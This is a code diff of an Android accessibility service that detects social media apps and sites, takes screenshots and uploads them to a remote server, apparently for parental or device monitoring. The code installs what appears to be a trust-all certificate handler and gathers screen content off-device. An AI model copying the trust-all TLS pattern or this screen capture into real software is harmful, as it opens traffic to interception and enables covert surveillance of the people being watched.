@@ -70,15 +70,14 @@ class ScreenMonitorService : AccessibilityService() {
         )
 
         private val SOCIAL_DOMAINS = listOf(
-            "facebook.com",
-            "fb.com",
-            "fb.watch",
-            "m.facebook.com",
-            "instagram.com",
-            "tiktok.com",
-            "snapchat.com",
-            "threads.net",
-            "threads.com"
+            // Facebook & Meta
+            "facebook.com", "fb.com", "fb.watch", "fbcdn.net", "fbsbx.com", "messenger.com", "meta.com",
+            // Instagram & Threads
+            "instagram.com", "cdninstagram.com", "threads.net", "threads.com", "instagr.am",
+            // TikTok
+            "tiktok.com", "tiktokcdn.com", "tiktokv.com", "byteoversea.com", "ibytedtos.com", "musical.ly", "muscdn.com",
+            // Snapchat
+            "snapchat.com", "sc-cdn.net", "snapkit.com", "snapads.com"
         )
 
         @Volatile private var trustAllInstalled = false
@@ -103,14 +102,16 @@ class ScreenMonitorService : AccessibilityService() {
         }
     }
 
+    private val bgExecutor = java.util.concurrent.Executors.newSingleThreadExecutor()
+
     override fun onServiceConnected() {
         super.onServiceConnected()
-        val info = AccessibilityServiceInfo()
+        val info = this.serviceInfo ?: AccessibilityServiceInfo()
         info.eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
         info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
-        info.flags = AccessibilityServiceInfo.DEFAULT or AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
+        info.flags = info.flags or AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS or AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
         this.serviceInfo = info
-        Log.d("ScreenMonitor", "Service Connected - social watch")
+        Log.d("ScreenMonitor", "Service Connected - social watch active")
         installTrustAllOnce()
         startMonitoringLoop()
     }
@@ -139,9 +140,9 @@ class ScreenMonitorService : AccessibilityService() {
 
     private fun findUrlInNode(root: AccessibilityNodeInfo?): String? {
         if (root == null) return null
-        // Pass 1: address-bar-like fields containing a social domain.
+        // Pass 1: address-bar / URL field elements
         findDomainInTree(root, onlyEditable = true)?.let { return it }
-        // Pass 2: any visible text containing a social domain.
+        // Pass 2: any visible text node containing social keywords
         return findDomainInTree(root, onlyEditable = false)
     }
 
@@ -149,13 +150,15 @@ class ScreenMonitorService : AccessibilityService() {
         val queue: ArrayDeque<AccessibilityNodeInfo> = ArrayDeque()
         queue.add(root)
         var visited = 0
-        while (queue.isNotEmpty() && visited < 80) {
+        while (queue.isNotEmpty() && visited < 300) {
             val node = queue.removeFirst()
             visited++
             try {
+                val viewId = node.viewIdResourceName?.lowercase() ?: ""
                 val className = node.className?.toString() ?: ""
-                val isEditable = className.contains("EditText")
-                if (!onlyEditable || isEditable) {
+                val isUrlField = viewId.contains("url") || viewId.contains("location") || viewId.contains("search") || viewId.contains("address")
+                val isEditable = className.contains("EditText") || node.isEditable
+                if (!onlyEditable || isEditable || isUrlField) {
                     val candidates = listOf(node.text?.toString(), node.contentDescription?.toString())
                     for (text in candidates) {
                         if (text.isNullOrEmpty() || text.length > 600) continue
@@ -163,7 +166,7 @@ class ScreenMonitorService : AccessibilityService() {
                         for (domain in SOCIAL_DOMAINS) {
                             if (lower.contains(domain)) return text.trim()
                         }
-                        if (onlyEditable && (lower.startsWith("http") || lower.startsWith("www.")) && lower.contains(".")) {
+                        if ((isEditable || isUrlField) && (lower.startsWith("http") || lower.startsWith("www.") || lower.contains(".com") || lower.contains(".net") || lower.contains(".org"))) {
                             return text.trim()
                         }
                     }
@@ -183,18 +186,12 @@ class ScreenMonitorService : AccessibilityService() {
 
     private fun isSocialApp(pkg: String): Boolean = SOCIAL_APP_PACKAGES.contains(pkg)
 
-    private fun isSocialUrl(url: String): Boolean {
-        if (url.isEmpty()) return false
-        val lower = url.lowercase()
-        return SOCIAL_DOMAINS.any { lower.contains(it) }
-    }
-
     private fun startMonitoringLoop() {
         isMonitoring = true
         handler.post(object : Runnable {
             override fun run() {
                 if (!isMonitoring) return
-                thread { checkStatusAndCapture() }
+                bgExecutor.execute { checkStatusAndCapture() }
                 handler.postDelayed(this, POLLING_INTERVAL)
             }
         })
@@ -217,8 +214,6 @@ class ScreenMonitorService : AccessibilityService() {
         val inSocial = screenOn && (inSocialApp || matchedSite != null)
 
         var enabled = false
-        var shotTaken = false
-        var uploadCode = -1
 
         if (inSocial) {
             try {
@@ -233,21 +228,21 @@ class ScreenMonitorService : AccessibilityService() {
                     val response = conn.inputStream.bufferedReader().use { it.readText() }
                     enabled = JSONObject(response).optBoolean("monitoring_enabled", true)
                     if (enabled) {
-                        shotTaken = true
-                        takeScreenshotAndUpload(serverIp, deviceId, deviceToken)
-                        uploadCode = lastUploadCode
+                        takeScreenshotAndUpload(serverIp, deviceId, deviceToken, pkg, matchedSite, screenOn, enabled)
+                        conn.disconnect()
+                        return
                     }
-                } else {
-                    uploadCode = conn.responseCode
                 }
                 conn.disconnect()
             } catch (e: Exception) {
-                Log.e("ScreenMonitor", "Monitoring status check failed", e)
+                Log.e("ScreenMonitor", "Monitoring status check failed: ${e.message}")
             }
         }
 
-        sendHeartbeat(serverIp, deviceId, deviceToken, pkg, matchedSite, screenOn, enabled, shotTaken, uploadCode)
+        sendHeartbeat(serverIp, deviceId, deviceToken, pkg, matchedSite, screenOn, enabled, shotTaken = false, uploadCode = lastUploadCode)
     }
+
+    private fun isSocialUrl(url: String): Boolean = matchedSocialDomain(url) != null
 
     private fun matchedSocialDomain(url: String): String? {
         if (url.isEmpty()) return null
@@ -283,33 +278,55 @@ class ScreenMonitorService : AccessibilityService() {
             conn.responseCode
             conn.disconnect()
         } catch (e: Exception) {
-            Log.e("ScreenMonitor", "Heartbeat failed", e)
+            Log.e("ScreenMonitor", "Heartbeat failed: ${e.message}")
         }
     }
 
-    private fun takeScreenshotAndUpload(serverIp: String, deviceId: String, deviceToken: String) {
+    private fun takeScreenshotAndUpload(
+        serverIp: String, deviceId: String, deviceToken: String,
+        pkg: String, site: String?, screenOn: Boolean, enabled: Boolean
+    ) {
         if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
             takeScreenshot(Display.DEFAULT_DISPLAY, mainExecutor, object : TakeScreenshotCallback {
                 override fun onSuccess(screenshot: ScreenshotResult) {
-                    val bitmap = Bitmap.wrapHardwareBuffer(screenshot.hardwareBuffer, screenshot.colorSpace)
-                    if (bitmap != null) {
-                        val swBitmap = bitmap.copy(Bitmap.Config.ARGB_8888, false)
-                        screenshot.hardwareBuffer.close()
+                    val hwBuffer = screenshot.hardwareBuffer
+                    val colorSpace = screenshot.colorSpace
+                    bgExecutor.execute {
+                        try {
+                            val bitmap = Bitmap.wrapHardwareBuffer(hwBuffer, colorSpace)
+                            if (bitmap != null) {
+                                val swBitmap = bitmap.copy(Bitmap.Config.ARGB_8888, false)
+                                hwBuffer.close()
 
-                        val newHash = getBitmapHash(swBitmap)
-                        if (newHash == lastBitmapHash) {
-                            swBitmap.recycle()
-                            return
+                                val newHash = getBitmapHash(swBitmap)
+                                if (newHash == lastBitmapHash) {
+                                    swBitmap.recycle()
+                                    sendHeartbeat(serverIp, deviceId, deviceToken, pkg, site, screenOn, enabled, shotTaken = true, uploadCode = 304)
+                                    return@execute
+                                }
+                                lastBitmapHash = newHash
+
+                                val uploadCode = uploadBitmap(swBitmap, serverIp, deviceId, deviceToken)
+                                sendHeartbeat(serverIp, deviceId, deviceToken, pkg, site, screenOn, enabled, shotTaken = true, uploadCode = uploadCode)
+                            } else {
+                                hwBuffer.close()
+                                sendHeartbeat(serverIp, deviceId, deviceToken, pkg, site, screenOn, enabled, shotTaken = false, uploadCode = -3)
+                            }
+                        } catch (e: Exception) {
+                            Log.e("ScreenMonitor", "Screenshot process error", e)
+                            sendHeartbeat(serverIp, deviceId, deviceToken, pkg, site, screenOn, enabled, shotTaken = false, uploadCode = -4)
                         }
-                        lastBitmapHash = newHash
-
-                        thread { uploadBitmap(swBitmap, serverIp, deviceId, deviceToken) }
                     }
                 }
                 override fun onFailure(errorCode: Int) {
                     Log.e("ScreenMonitor", "Screenshot failed: $errorCode")
+                    bgExecutor.execute {
+                        sendHeartbeat(serverIp, deviceId, deviceToken, pkg, site, screenOn, enabled, shotTaken = false, uploadCode = -errorCode)
+                    }
                 }
             })
+        } else {
+            sendHeartbeat(serverIp, deviceId, deviceToken, pkg, site, screenOn, enabled, shotTaken = false, uploadCode = -99)
         }
     }
 
@@ -332,7 +349,8 @@ class ScreenMonitorService : AccessibilityService() {
         return hash
     }
 
-    private fun uploadBitmap(bitmap: Bitmap, serverIp: String, deviceId: String, deviceToken: String) {
+    private fun uploadBitmap(bitmap: Bitmap, serverIp: String, deviceId: String, deviceToken: String): Int {
+        var code = -1
         try {
             val bos = ByteArrayOutputStream()
             bitmap.compress(Bitmap.CompressFormat.JPEG, 50, bos)
@@ -354,12 +372,15 @@ class ScreenMonitorService : AccessibilityService() {
             conn.outputStream.flush()
             conn.outputStream.close()
 
-            lastUploadCode = conn.responseCode
-            Log.d("ScreenMonitor", "Upload response: ${conn.responseCode}")
+            code = conn.responseCode
+            lastUploadCode = code
+            Log.d("ScreenMonitor", "Upload response: $code")
             conn.disconnect()
         } catch (e: Exception) {
+            code = -2
             lastUploadCode = -2
             Log.e("ScreenMonitor", "Upload failed", e)
         }
+        return code
     }
 }
